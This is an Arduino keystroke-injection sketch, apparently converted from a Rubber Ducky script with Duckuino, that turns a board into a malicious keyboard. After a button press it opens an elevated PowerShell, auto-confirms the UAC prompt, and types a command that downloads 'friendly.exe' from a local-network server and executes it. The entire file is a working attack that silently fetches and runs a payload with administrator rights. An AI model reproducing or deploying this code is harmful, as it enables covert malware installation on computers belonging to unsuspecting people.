/**
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

#define btn 2


void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  pinMode(btn, INPUT);
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  while (!digitalRead(btn)) {
       // leaving it blank
    }
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);
  // my best attempt at a elevated powershell instance
  Keyboard.print(F("powershell Start-Process powershell -Verb runAs"));

  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  delay(200);
  Keyboard.print(F("$down = New-Object System.Net.WebClient; $url = 'http://192.168.29.107:8000/friendly.exe'; $file = 'friendly.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;"));
  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
